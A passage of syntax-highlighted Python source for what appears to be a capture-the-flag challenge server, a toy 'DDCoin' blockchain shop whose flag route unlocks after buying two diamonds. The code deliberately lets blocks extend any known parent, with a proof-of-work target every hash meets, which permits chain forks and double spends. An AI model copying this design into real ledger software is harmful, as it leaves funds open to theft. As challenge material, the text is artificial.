    <span class="token keyword">if</span> type<span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'prev_block_hash should be hex-encoded hash value'</span><span class="token punctuation">)</span>
    nonce <span class="token operator">=</span> str<span class="token punctuation">(</span>nonce_str<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'the nonce is too long'</span><span class="token punctuation">)</span>
    block <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'prev'</span><span class="token punctuation">:</span> prev_block_hash<span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">:</span> nonce<span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">:</span> transactions<span class="token punctuation">}</span>
    block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_block<span class="token punctuation">(</span>block<span class="token punctuation">)</span>
    <span class="token keyword">return</span> block

<span class="token keyword">def</span> <span class="token function">find_blockchain_tail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> max<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> block<span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">calculate_utxo</span><span class="token punctuation">(</span>blockchain_tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
    curr_block <span class="token operator">=</span> blockchain_tail
    blockchain <span class="token operator">=</span> <span class="token punctuation">[</span>curr_block<span class="token punctuation">]</span>
    <span class="token keyword">while</span> curr_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        curr_block <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>curr_block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        blockchain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curr_block<span class="token punctuation">)</span>
    blockchain <span class="token operator">=</span> blockchain<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    utxos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> block <span class="token keyword">in</span> blockchain<span class="token punctuation">:</span>
        <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> input_utxo_id <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>input_utxo_id<span class="token punctuation">]</span>
            <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                utxos<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> utxo
    <span class="token keyword">return</span> utxos

<span class="token keyword">def</span> <span class="token function">calculate_balance</span><span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    balance <span class="token operator">=</span> <span class="token punctuation">{</span>bank_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> hacker_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> shop_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> balance<span class="token punctuation">:</span>
            balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> balance

<span class="token keyword">def</span> <span class="token function">verify_utxo_signature</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">append_block</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> difficulty<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    has_attrs<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown parent block"</span><span class="token punctuation">)</span>
    tail <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>

    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please put a transaction array in the block'</span><span class="token punctuation">)</span>
    new_utxo_ids <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        has_attrs<span class="token punctuation">(</span>tx<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            has_attrs<span class="token punctuation">(</span>utxo<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> new_utxo_ids<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"output utxo of same id({}) already exists."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            new_utxo_ids<span class="token punctuation">.</span>add<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of amount of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid amount of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of address of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                addr_to_pubkey<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid type of address({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
        tot_output <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo ids in tx should be array"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo signatures in tx should be array"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"lengths of arrays of ids and signatures of input utxos should be the same"</span><span class="token punctuation">)</span>
        tot_input <span class="token operator">=</span> <span class="token number">0</span>
        tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> utxo_id<span class="token punctuation">,</span> signature <span class="token keyword">in</span> zip<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of input utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> utxo_id <span class="token operator">not</span> <span class="token keyword">in</span> utxos<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid id of input utxo. Input utxo({}) does not exist or it has been consumed."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
            utxo <span class="token operator">=</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>signature<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of signature of input utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> verify_utxo_signature<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Signature of input utxo is not valid. You are not the owner of this input utxo({})!"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
            tot_input <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
            <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
        <span class="token keyword">if</span> tot_output <span class="token operator">></span> tot_input<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"You don't have enough amount of DDCoins in the input utxo! {}/{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tot_input<span class="token punctuation">,</span> tot_output<span class="token punctuation">)</span><span class="token punctuation">)</span>
        tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>

    block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    block_hash <span class="token operator">=</span> int<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> block_hash <span class="token operator">></span> difficulty<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please provide a valid Proof-of-Work'</span><span class="token punctuation">)</span>
    block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> tail<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'The blockchain is too long. Use ./reset to reset the blockchain'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'A same block is already in the blockchain'</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> block
    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token comment" spellcheck="true"># First, the bank issued some DDCoins ...</span>
        total_currency_issued <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
        genesis_transaction <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create DDCoins from nothing</span>
        genesis_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>EMPTY_HASH<span class="token punctuation">,</span> <span class="token string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>genesis_transaction<span class="token punctuation">]</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span>
        genesis_block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block

        <span class="token comment" spellcheck="true"># Then, the bank was hacked by the hacker ...</span>
        handout <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>hacker_address<span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>
        reserved <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        transferred <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>handout<span class="token punctuation">,</span> reserved<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
        second_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'HAHA, I AM THE BANK NOW!'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>second_block<span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># Can you buy 2 diamonds using all DDCoins?</span>
        third_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>second_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'a empty block'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>third_block<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_balance_of_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
    tail <span class="token operator">=</span> find_blockchain_tail<span class="token punctuation">(</span><span class="token punctuation">)</span>
    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>
    <span class="token keyword">return</span> calculate_balance<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">homepage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    announcement <span class="token operator">=</span> <span class="token string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span>
    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
    genesis_block_info <span class="token operator">=</span> <span class="token string">'hash of genesis block: '</span> <span class="token operator">+</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
    addr_info <span class="token operator">=</span> <span class="token string">'the bank\'s addr: '</span> <span class="token operator">+</span> bank_address <span class="token operator">+</span> <span class="token string">', the hacker\'s addr: '</span> <span class="token operator">+</span> hacker_address <span class="token operator">+</span> <span class="token string">', the shop\'s addr: '</span> <span class="token operator">+</span> shop_address
    balance_info <span class="token operator">=</span> <span class="token string">'Balance of all addresses: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>balance<span class="token punctuation">)</span>
    utxo_info <span class="token operator">=</span> <span class="token string">'All utxos: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span>
    blockchain_info <span class="token operator">=</span> <span class="token string">'Blockchain Explorer: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    view_source_code_link <span class="token operator">=</span> <span class="token string">"&lt;a href='source_code'>View source code&lt;/a>"</span>
    <span class="token keyword">return</span> announcement<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'&lt;br />&lt;br />\r\n\r\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>view_source_code_link<span class="token punctuation">,</span> genesis_block_info<span class="token punctuation">,</span> addr_info<span class="token punctuation">,</span> balance_info<span class="token punctuation">,</span> utxo_info<span class="token punctuation">,</span> blockchain_info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span>
